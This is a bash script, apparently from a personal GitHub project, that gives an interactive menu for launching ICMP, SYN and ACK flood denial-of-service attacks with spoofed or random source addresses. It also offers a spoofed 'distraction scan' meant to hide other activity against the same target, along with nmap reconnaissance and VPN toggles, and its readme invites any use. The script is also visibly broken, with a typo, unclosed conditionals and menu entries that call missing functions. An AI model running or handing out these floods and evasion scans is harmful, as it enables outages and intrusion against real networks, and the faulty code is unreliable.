#!/bin/bash

# -- WELCOME TO THE UPDATED PENTESTING MENU BY XFWMK https://github.com/xfwmk -- #

# -- shows its not the default shell -- # 
PS3=""" 
kali>"""

####################
# -- PREP SHELL -- #
echo -e "\033[31m" ## RED TEXT ##
chear && echo 
echo -e '\e[5 q' ## BLINKING LINE CURSOR ## 
# ---------------- #
####################

##################################
# -- ASCII ART (CLEARS SHELL) -- #
kalilogo() {
	clear && echo ""
echo ".............."
echo """            ..,;:ccc,.
          ......''';lxO.                            
.....''''..........,:ld;
           .';;;:::;,,.x,                           
      ..'''.            0Xxoc:,.  ...               
  ....                ,ONkc;,;cokOdc',.             
 .                   OMo           ':ddo.           
                    dMc               :OO;          
                    0M.                 .:o.
                    ;Wd                             
                     ;XO,                           
                       ,d0Odlc;,..                  
                           ..',;:cdOOd::,.          
                                    .:d;.':;.       
                                       'd,  .'      
                                         ;l   ..
                                          .o        
                                            c       """
}
##############################

################
# -- README -- #
readmepls() {
kalilogo
echo "Readme:"
echo " "
echo "ANYONE WHO USES THIS IS RESPONSIBLE FOR THEIR OWN DECISIONS AND POTENTIAL ILLEGAL ACTIVITIES, THE AUTHOR CLAIMS NO RESPONSIBILITY FOR UR STUPIDNESS"
echo "USE HOWEVER YOU WANT"
echo "BY XFWMK: https://github.com/xfwmk"
echo "Press enter to return to main menu..."
read var
mainmenu
}
############

###################
# -- MAIN MENU -- # 
mainmenu() {
mainmenu=("DoS" "Reconmenu" "Security" "Readme" "Quit" )
kalilogo
echo "Main Menu"
echo " "
select opt in "${mainmenu[@]}"; do
    if [ "$opt" = "Quit" ]; then
    echo "Shutting down services..." && sleep 0.2 && clear
    bash
    exit 0
    elif [ "$opt" = "Security" ]; then
Security
    elif [ "$opt" = "DoS" ]; then
dosmenu
    elif [ "$opt" = "Readme" ]; then
readmepls
    elif [ "$opt" = "Reconmenu" ]; then
reconmenu
    else
    echo "Invalid option, Press return for main menu"
    read var
    mainmenu
    fi
done
}
###############

##################
# -- DOS MENU -- #
dosmenu() {
kalilogo
echo "DoS Menu"
echo
		dosmenu=("ICMP Echo Flood" "TCP SYN Flood" "TCP ACK Flood" "Distraction Scan" "Go back")
	select dosopt in "${dosmenu[@]}"; do
	if [ "$dosopt" = "ICMP Echo Flood" ]; then
		icmpflood
 	elif [ "$dosopt" = "TCP SYN Flood" ]; then
		synflood
	elif [ "$dosopt" = "TCP ACK Flood" ]; then
		ackflood
	elif [ "$dosopt" = "Distraction Scan" ]; then
		distractionscan
	elif [ "$dosopt" = "Go back" ]; then
		mainmenu
	else
  	echo "Invalid option, press enter to show menu"
    read var
    dosmenu
done
}
# -------------- #
##################

####################
# -- RECON MENU -- #
reconmenu() {
kalilogo
echo "Recon Menu"
echo
		reconmenu=("Show IP" "DNS Recon" "Ping Sweep" "Quick Scan" "Detailed Scan" "UDP Scan" "Check Server Uptime" "Go back")
	select reconopt in "${reconmenu[@]}"; do
	if [ "$reconopt" = "Show IP" ]; then
		showip
  elif [ "$reconopt" = "DNS Recon" ]; then
      dnsrecon
  elif [ "$reconopt" = "Ping Sweep" ]; then
      pingsweep
  elif [ "$reconopt" = "Quick Scan" ]; then
      quickscan
  elif [ "$reconopt" = "Detailed Scan" ]; then
      detailedscan
	elif [ "$reconopt" = "UDP Scan" ]; then
		udpscan
  elif [ "$reconopt" = "Check Server Uptime" ]; then
        checkuptime
	elif [ "$reconopt" = "Go back" ]; then
		mainmenu
	else
    echo "Invalid option, Press enter to show menu"
    read var
    reconmenu
	done
}
# ---------------- #
####################

##################
# -- SECURITY -- #
security() {
kalilogo
echo "Security Menu"
echo
    securitymenu=("VPN" "TOR" "Proxychains" "Go Back")
  select opt in "${securitymenu[@]}"; do
  if [ "$opt" = "VPN" ]; then
    vpn
  elif [ "$opt" = "TOR" ]; then
    tor
  elif [ "$opt" = "Proxychains" ]; then
    proxychains
  elif [ "$opt" = "Go Back" ]; then
    mainmenu
  else
    echo "Invalid option, Press enter to show menu"
    read var
    security
  done
}
# -------------- #
##################

##############################################################
# ------------------- DOS ATTACK SECTION ------------------- #
##############################################################

#####################
# -- ICMP FLOOD -- #
icmpflooddos() {
		echo "Preparing to launch ICMP Echo Flood using hping3"
        echo "Warning: if used for malicious intent YOU are responsible for the consequences"
		echo "Enter target IP/hostname:"
		read -i $TARGET -e TARGET
		echo "Enter spoofed IP or (r)andom or (i)nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting ICMP echo, cancel at any time..."
		sudo hping3 -1 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting ICMP Echo, cancel at any time..."
		sudo hping3 -1 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting ICMP Echo, cancel at any time..."
		#sleep 3h
		sudo hping3 -1 --flood $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting ICMP Echo, cancel at any time..."
		sudo hping3 -1 --flood $TARGET
	fi
}
# ----------------- #
#####################

###################
# -- SYN FLOOD -- #
synflooddos() {
	echo "This uses hping3. checking for presence..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
		echo "Enter target:"
	read -i $TARGET -e TARGET
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	echo "Send data with SYN packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
	else DATA=0
	fi
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting SYN flood, cancel at any time..."
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -S $TARGET
	elif [ "$SOURCE" = "r" ]; then
        echo "Starting SYN flood, cancel at any time..."
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -S $TARGET
	elif [ "$SOURCE" = "i" ]; then
        echo "Starting SYN flood, cancel at any time..."
		sudo hping3 -d $DATA --flood --frag -p $PORT -S $TARGET
	else echo "Not a valid option!  Using interface IP"
        echo "Starting SYN flood, cancel at any time..."
		sudo hping3 --flood -d $DATA --frag -p $PORT -S $TARGET
	fi
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "using nping isnt ideal however"
		echo "Enter target:"
	read -i $TARGET -e TARGET
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
		: ${PORT:=80}
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting SYN Flood..."
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
# --------------- #
###################

###################
# -- ACK FLOOD -- #
ackflooddos() {
	echo "This uses hping3, checking for presence..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
		echo "Enter target:"
	read -i $TARGET -e TARGET
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	echo "Send data with ACK packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
	else DATA=0
	fi
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
        echo "Starting ACK flood, cancel at any time..."
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -A $TARGET
	elif [ "$SOURCE" = "r" ]; then
        echo "Starting ACK flood, cancel at any time..."
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -A $TARGET
	elif [ "$SOURCE" = "i" ]; then
        echo "Starting ACK flood, cancel at any time..."
		sudo hping3 -d $DATA --flood --frag -p $PORT -A $TARGET
	else echo "Not a valid option!  Using interface IP"
        echo "Starting ACK flood, cancel at any time..."
		sudo hping3 --flood -d $DATA --frag -p $PORT -A $TARGET
	fi
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "trying with nping, this isnt ideal however"
		echo "Enter target:"
	read -i $TARGET -e TARGET
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP ACK Flood..."
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
# --------------- #
###################

##########################
# -- DISTRACTION SCAN -- #
distractionscandos() { 
echo "(extra loud) TCP SYN scan from any spoofed IP address"
echo """This is intentionally obvious so you can perform "legal" activities on the same target undetected"""
echo "Enter target:"
read -i $TARGET -e TARGET
echo "Enter spoofed address:"
read -i $SOURCE -e SOURCE
for i in {1..50}; do echo "sending scan $i" && sudo hping3 --scan all --spoof $SOURCE -S $TARGET 2>/dev/null 1>/dev/null; done
exit 0
}
# ---------------------- #
##########################

##################################################################
# ------------------- DOS ATTACK SECTION END ------------------- #
##################################################################

#################
# -- SHOW IP -- #
showip() {
kalilogo
echo "Show IP:"
echo
		curl https://icanhazip.com/s/
		echo ""
		echo ""
		echo "Interface IP's are:"
		ip a|grep inet
	if ! [[ $? = 0 ]]; then
		ifconfig|grep inet
  echo "Press enter to return to reconmenu."
  read var
  reconmenu
}
# ------------- #
#################

###################
# -- DNS RECON -- #
dnsrecon() {
kalilogo
	echo "Enter target: "
	read -i $TARGET -e TARGET
host $TARGET
if ! [[ $? = 0 ]]; then
nslookup $TARGET
fi
sleep 1 && whois -H $TARGET
if ! [[ $? = 0 ]]; then
sleep 1 && curl ipinfo.io/$TARGET
fi
echo "Press enter to return to reconmenu."
read var
reconmenu
}
# --------------- #
###################

####################
# -- PING SWEEP -- #
pingsweep() { 
	echo "This module performs a simple ICMP echo 'ping' sweep"
	echo "Please enter the target (e.g. 192.168.1.0/24):"
	read -i $TARGET -e TARGET
sudo nmap -sP -PE $TARGET --reason
echo "Press enter to return to reconmenu."
read var
reconmenu
}
# ---------------- #
####################

####################
# -- QUICK SCAN -- #
quickscan() {
echo "This module conducts a scan using nmap"
echo "It is designed to scan an entire network for common open ports"
echo "It will perform a TCP SYN port scan of the 1000 most common ports"
echo "Depending on the target, the scan might take a long time to finish"
echo "Please enter the target host/IP/subnet:"
read -i $TARGET -e TARGET
echo "Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.
Default is 3:"
read -i $SPEED -e SPEED
: ${SPEED:=3}
sudo nmap -Pn -sS -T $SPEED $TARGET --reason
echo "Press enter to return to reconmenu."
read var
reconmenu
}
# ---------------- #
####################

############################
# -- START DETAILEDSCAN -- #
detailedscan() {
echo "This module performs a scan using nmap"
echo "It is designed to perform a detailed scan of a specific host but can be used against an entire network"
echo "This scans ALL ports on the target. It also attempts OS detection and gathers service information"
echo "This scan might take a very long time to finish, please be patient"
echo "Enter the hostname/IP/subnet to scan:"
read -i $TARGET -e TARGET
echo "Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.
Default is 3:"
read -i $SPEED -e SPEED
: ${SPEED:=3}
sudo nmap -script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43" -Pn -p 1-65535 -sV -sC -A -O -T $SPEED $TARGET --reason
echo "Press enter to return to reconmenu."
read var
reconmenu
}
# ------------------- #
#######################

##################
# -- UDP SCAN -- #
udpscan() {
echo "This module lets you scan a host/network for open UDP ports"
echo "It scans ALL ports on the target system. This may take some time, please be patient"
echo "Enter the host/subnet to scan:"
read -i $TARGET -e TARGET
echo "Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.
Default is 3:"
read -i $SPEED -e SPEED
: ${SPEED:=3}
sudo nmap -Pn -p 1-65535 -sU -T $SPEED $TARGET --reason
echo "Press enter to return to reconmenu."
read var
reconmenu
}
# -------------- #
##################

######################
# -- CHECK UPTIME -- #
checkuptime() {
  echo "This module will attempt to estimate the uptime of a given server, using hping3"
  echo "This is not guaranteed to work"
  echo "Enter your target:"
  read -i $TARGET -e TARGET
  echo "Enter port (default is 80):"
  read -i $PORT -e PORT
  : ${PORT:=80}
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
  echo "Retries? (3 is ideal and default, 2 might also work)"
  read -i $RETRY -e RETRY
  : ${RETRY:=3}
  echo "Starting.."
  sudo hping3 --tcp-timestamp -S $TARGET -p $PORT -c $RETRY | grep uptime
  echo "Done."
  echo "Press enter to return to reconmenu."
  read var
  reconmenu
}
# ------------------ #
######################

##################
# -- VPN MENU -- #
vpn() {
kalilogo
echo "VPN Menu"
echo
	vpnmenu=("Status" "Enable" "Disable" "Go back")
  select opt in "${vpnmenu[@]}"; do
  if [ "$opt" = "Status" ]; then
mullvad status
echo "Press enter to return."
read var
vpn
  elif [ "$opt" = "Enable" ]; then
mullvad connect
echo "Press enter to return."
read var
vpn
  elif [ "$opt" = "Disable" ]; then
mullvad disconnect
echo "Press enter to return."
read var
vpn
  elif [ "$opt" = "Go back" ]; then
security
  else
  echo "Invalid option, press enter to return to menu."
  read var
  vpn
}
# -------------- #
##################

##################
# -- TOR MENU -- #
tor() {
kalilogo
echo "TOR Menu"
echo
}
# -------------- #
##################

##########################
# -- PROXYCHAINS MENU -- #
proxychains() {
kalilogo
echo "Proxycahins Menu"
echo
}
# ---------------------- #
##########################

###############
# -- START -- #
mainmenu      #
# ----------- #
###############
